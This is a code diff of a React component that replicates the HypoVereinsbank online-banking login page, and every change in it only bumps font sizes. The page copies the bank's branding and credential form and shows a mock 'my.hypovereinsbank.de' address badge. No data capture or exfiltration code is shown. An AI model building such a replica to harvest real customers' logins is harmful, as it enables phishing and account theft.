@@ -92,7 +92,7 @@ const Hypovereinsbank = () => {
             <a href="#" onClick={noop} className="flex items-center pr-6 lg:pr-10">
               <HVBLogo className="h-7 w-auto" />
             </a>
-            <nav className="hidden lg:flex flex-1 items-center justify-center gap-6 text-[14px]">
+            <nav className="hidden lg:flex flex-1 items-center justify-center gap-6 text-[15px]">
               {NAV_ITEMS.map((n) => (
                 <a
                   key={n}
@@ -115,7 +115,7 @@ const Hypovereinsbank = () => {
                   key={it.label}
                   href="#"
                   onClick={noop}
-                  className="flex flex-col items-center justify-center px-3 py-2 text-[11px]"
+                  className="flex flex-col items-center justify-center px-3 py-2 text-[12px]"
                   style={{ color: "#4a4a4a" }}
                 >
                   <it.icon size={18} strokeWidth={1.5} />
@@ -125,7 +125,7 @@ const Hypovereinsbank = () => {
               <a
                 href="#"
                 onClick={noop}
-                className="flex flex-col items-center justify-center text-white px-4 self-stretch text-[11px] tracking-wide"
+                className="flex flex-col items-center justify-center text-white px-4 self-stretch text-[12px] tracking-wide"
                 style={{ backgroundColor: RED, minWidth: 88 }}
               >
                 <LogIn size={18} strokeWidth={1.75} />
@@ -138,7 +138,7 @@ const Hypovereinsbank = () => {
               <a
                 href="#"
                 onClick={noop}
-                className="flex flex-col items-center justify-center text-white px-3 h-full text-[10px] tracking-wide"
+                className="flex flex-col items-center justify-center text-white px-3 h-full text-[11px] tracking-wide"
                 style={{ backgroundColor: RED, minWidth: 72 }}
               >
                 <LogIn size={18} strokeWidth={1.75} />
@@ -162,21 +162,21 @@ const Hypovereinsbank = () => {
             {/* Login card */}
             <div className="lg:col-span-5">
               <div className="bg-white shadow-md p-7 lg:p-9 max-w-[460px]">
-                <h1 className="text-[26px] leading-tight font-light mb-5" style={{ color: DARK }}>
+                <h1 className="text-[28px] leading-tight font-light mb-5" style={{ color: DARK }}>
                   Willkommen im HVB Online Banking
                 </h1>
-                <div className="text-[13px] mb-2 flex items-center gap-2" style={{ color: "#4a4a4a" }}>
+                <div className="text-[14px] mb-2 flex items-center gap-2" style={{ color: "#4a4a4a" }}>
                   <span>Bitte überprüfen Sie immer die Korrektheit der Browser-URL:</span>
                   <Info size={14} style={{ color: TEAL }} />
                 </div>
                 <div
-                  className="inline-flex items-center gap-2 px-3 py-1.5 mb-5 text-[13px]"
+                  className="inline-flex items-center gap-2 px-3 py-1.5 mb-5 text-[14px]"
                   style={{ backgroundColor: "#F1F3F4", color: "#3c4043", borderRadius: 2 }}
                 >
                   <Lock size={13} />
                   <span>my.hypovereinsbank.de/…</span>
                 </div>
-                <p className="text-[14px] mb-4 font-semibold" style={{ color: DARK }}>
+                <p className="text-[15px] mb-4 font-semibold" style={{ color: DARK }}>
                   Bitte loggen Sie sich ein.
                 </p>
 
@@ -186,7 +186,7 @@ const Hypovereinsbank = () => {
                   <input type="password" name="prevent_autofill_pw" autoComplete="new-password" style={{ display: "none" }} />
 
                   <label className="block mb-4">
-                    <span className="flex items-center gap-1.5 text-[13px] mb-1" style={{ color: DARK }}>
+                    <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
                       Direct Banking Nummer <Info size={13} style={{ color: TEAL }} />
                     </span>
                     <input
@@ -194,13 +194,13 @@ const Hypovereinsbank = () => {
                       value={username}
                       onChange={(e) => setUsername(e.target.value)}
                       autoComplete="off"
-                      className="w-full h-10 px-3 text-[14px] bg-white outline-none"
+                      className="w-full h-10 px-3 text-[15px] bg-white outline-none"
                       style={{ border: `1px solid ${BORDER}` }}
                     />
                   </label>
 
                   <label className="block mb-5">
-                    <span className="flex items-center gap-1.5 text-[13px] mb-1" style={{ color: DARK }}>
+                    <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
                       Passwort <Info size={13} style={{ color: TEAL }} />
                     </span>
                     <input
@@ -208,7 +208,7 @@ const Hypovereinsbank = () => {
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
                       autoComplete="new-password"
-                      className="w-full h-10 px-3 text-[14px] bg-white outline-none"
+                      className="w-full h-10 px-3 text-[15px] bg-white outline-none"
                       style={{ border: `1px solid ${BORDER}` }}
                     />
                   </label>
@@ -217,14 +217,14 @@ const Hypovereinsbank = () => {
                     <a
                       href="#"
                       onClick={noop}
-                      className="text-[13px] underline"
+                      className="text-[14px] underline"
                       style={{ color: TEAL }}
                     >
                       Zugangsdaten vergessen/gesperrt?
                     </a>
                     <button
                       type="submit"
-                      className="text-white text-[13px] tracking-wider font-semibold px-6 h-10"
+                      className="text-white text-[14px] tracking-wider font-semibold px-6 h-10"
                       style={{ backgroundColor: TEAL }}
                       onMouseOver={(e) => (e.currentTarget.style.backgroundColor = TEAL_DARK)}
                       onMouseOut={(e) => (e.currentTarget.style.backgroundColor = TEAL)}
@@ -233,7 +233,7 @@ const Hypovereinsbank = () => {
                     </button>
                   </div>
 
-                  <div className="text-[13px]" style={{ color: DARK }}>
+                  <div className="text-[14px]" style={{ color: DARK }}>
                     <div className="font-semibold mb-1">Sie haben noch kein Online Banking?</div>
                     <div>
                       <a href="#" onClick={noop} className="underline" style={{ color: TEAL }}>
@@ -249,13 +249,13 @@ const Hypovereinsbank = () => {
                   className="mt-6 -mx-7 lg:-mx-9 -mb-7 lg:-mb-9 px-7 lg:px-9 py-4"
                   style={{ backgroundColor: WARN_BG }}
                 >
-                  <div className="text-[12px] mb-1" style={{ color: "#4a4a4a" }}>
+                  <div className="text-[13px] mb-1" style={{ color: "#4a4a4a" }}>
                     06.08.2026
                   </div>
                   <a
                     href="#"
                     onClick={noop}
-                    className="text-[13px] font-semibold uppercase tracking-wide flex items-center gap-2"
+                    className="text-[14px] font-semibold uppercase tracking-wide flex items-center gap-2"
                     style={{ color: TEAL }}
                   >
                     Warnung – Phishing E-Mails im Namen der HVB
@@ -268,16 +268,16 @@ const Hypovereinsbank = () => {
             {/* Right side help text (desktop only) */}
             <div className="hidden lg:flex lg:col-span-7 items-end">
               <div className="text-white max-w-[500px] mb-8 ml-auto mr-8">
-                <h2 className="text-[26px] font-light leading-snug mb-2">
+                <h2 className="text-[28px] font-light leading-snug mb-2">
                   Hilfe &amp; Services – 24/7 erreichbar!
                 </h2>
-                <p className="text-[15px] mb-4" style={{ color: "#f1f1f1" }}>
+                <p className="text-[16px] mb-4" style={{ color: "#f1f1f1" }}>
                   PIN ändern? Adresse bearbeiten? Alle Lösungen für Ihren Servicebedarf finden Sie hier
                 </p>
                 <a
                   href="#"
                   onClick={noop}
-                  className="inline-flex items-center gap-1 text-[13px] font-semibold uppercase tracking-wider underline"
+                  className="inline-flex items-center gap-1 text-[14px] font-semibold uppercase tracking-wider underline"
                 >
                   Jetzt entdecken <ChevronRight size={14} />
                 </a>
@@ -289,7 +289,7 @@ const Hypovereinsbank = () => {
         {/* Help cards */}
         <section className="w-full" style={{ backgroundColor: PANEL_BG }}>
           <div className="max-w-[1200px] mx-auto px-4 lg:px-6 py-16">
-            <h2 className="text-[22px] lg:text-[26px] font-light text-center mb-10" style={{ color: DARK }}>
+            <h2 className="text-[24px] lg:text-[28px] font-light text-center mb-10" style={{ color: DARK }}>
               Finden Sie hier Hilfestellungen für Ihr HVB Online Banking:
             </h2>
             <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
@@ -316,16 +316,16 @@ const Hypovereinsbank = () => {
                     style={{ width: 56, height: 56, objectFit: "contain" }}
                     className="mx-auto mb-6 block"
                   />
-                  <h3 className="text-[18px] font-semibold mb-3" style={{ color: DARK }}>
+                  <h3 className="text-[19px] font-semibold mb-3" style={{ color: DARK }}>
                     {card.title}
                   </h3>
-                  <p className="text-[14px] mb-5" style={{ color: "#4a4a4a" }}>
+                  <p className="text-[15px] mb-5" style={{ color: "#4a4a4a" }}>
                     {card.text}
                   </p>
                   <a
                     href="#"
                     onClick={noop}
-                    className="inline-flex items-center gap-2 text-[14px] underline"
+                    className="inline-flex items-center gap-2 text-[15px] underline"
                     style={{ color: TEAL }}
                   >
                     <ArrowDownToLine size={14} /> {card.cta}
@@ -339,14 +339,14 @@ const Hypovereinsbank = () => {
         {/* Contact band */}
         <section className="w-full" style={{ backgroundColor: TEAL, color: "#fff" }}>
           <div className="max-w-[1200px] mx-auto px-4 lg:px-6 py-14 text-center">
-            <h2 className="text-[26px] font-light mb-6">Sie haben eine Frage?</h2>
+            <h2 className="text-[28px] font-light mb-6">Sie haben eine Frage?</h2>
             <div className="flex items-center justify-center gap-4 mb-2">
               <Phone size={44} strokeWidth={1.25} />
-              <a href="#" onClick={noop} className="text-[32px] font-light inline-flex items-center gap-2">
+              <a href="#" onClick={noop} className="text-[34px] font-light inline-flex items-center gap-2">
                 +49 89 378 488 88 <ChevronRight size={24} />
               </a>
             </div>
-            <p className="text-[14px] mb-8" style={{ color: "#dff1f3" }}>
+            <p className="text-[15px] mb-8" style={{ color: "#dff1f3" }}>
               Mo – Fr: 08.00 – 20.00 Uhr und Sa: 08.00 – 14.00 Uhr
             </p>
             <div className="flex flex-wrap items-center justify-center gap-4">
@@ -355,7 +355,7 @@ const Hypovereinsbank = () => {
                   key={t}
                   href="#"
                   onClick={noop}
-                  className="px-6 py-3 text-[14px] border border-white hover:bg-white"
+                  className="px-6 py-3 text-[15px] border border-white hover:bg-white"
                   style={{ color: "#fff" }}
                   onMouseOver={(e) => {
                     e.currentTarget.style.color = TEAL;
@@ -375,19 +375,19 @@ const Hypovereinsbank = () => {
         <footer style={{ backgroundColor: "#1E1E1E", color: "#fff" }} className="flex-1">
           <div className="max-w-[1200px] mx-auto px-4 lg:px-6">
             <div className="py-6 flex flex-col lg:flex-row lg:items-center gap-4 border-b border-white/10">
-              <p className="text-[14px] flex-1" style={{ color: "#e6e6e6" }}>
+              <p className="text-[15px] flex-1" style={{ color: "#e6e6e6" }}>
                 Möchten Sie einen Widerruf erklären? Diese Funktion ist nur für den Widerruf vorgesehen. Für Kündigungen nutzen Sie bitte die dafür vorgesehenen Wege.
               </p>
               <a
                 href="#"
                 onClick={noop}
-                className="inline-flex items-center gap-2 border border-white px-5 py-3 text-[13px] font-semibold uppercase tracking-wider self-start lg:self-auto"
+                className="inline-flex items-center gap-2 border border-white px-5 py-3 text-[14px] font-semibold uppercase tracking-wider self-start lg:self-auto"
               >
                 Vertrag widerrufen <ChevronRight size={14} />
               </a>
             </div>
 
-            <div className="py-6 flex flex-wrap items-center gap-x-6 gap-y-3 text-[13px]">
+            <div className="py-6 flex flex-wrap items-center gap-x-6 gap-y-3 text-[14px]">
               {[
                 "Impressum",
                 "Rechtliche Hinweise",
@@ -405,7 +405,7 @@ const Hypovereinsbank = () => {
             </div>
 
             <div className="py-6 flex flex-col lg:flex-row lg:items-center gap-4 border-t border-white/10">
-              <p className="text-[13px] flex-1" style={{ color: "#bdbdbd" }}>© 2026 HypoVereinsbank</p>
+              <p className="text-[14px] flex-1" style={{ color: "#bdbdbd" }}>© 2026 HypoVereinsbank</p>
               <div className="flex items-center gap-6">
                 <img src={unicreditAsset.url} alt="UniCredit" className="h-6 w-auto" />
                 <img src={ferrariAsset.url} alt="Ferrari Premium Partner" className="h-9 w-auto" />
